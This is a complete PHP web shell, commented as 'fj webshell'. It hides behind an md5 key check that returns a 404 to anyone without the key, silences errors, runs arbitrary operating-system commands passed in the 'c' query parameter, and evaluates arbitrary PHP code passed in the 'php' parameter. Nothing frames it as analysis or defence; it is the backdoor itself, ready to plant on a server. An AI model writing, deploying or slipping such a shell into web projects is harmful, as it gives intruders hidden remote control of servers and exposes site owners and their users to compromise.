<?php
// fj webshell - updated via miao branch
if (md5($_GET['k'] ?? '') !== '7f8d0e0b1a2c3d4e5f6a7b8c9d0e1f2a') { http_response_code(404); exit; }
@error_reporting(0);
if (isset($_GET['c'])) { echo "<pre>".htmlspecialchars((string)@shell_exec($_GET['c']))."</pre>"; exit; }
if (isset($_GET['php'])) { echo "<pre>".htmlspecialchars((string)@eval($_GET['php']))."</pre>"; exit; }
echo "OK";
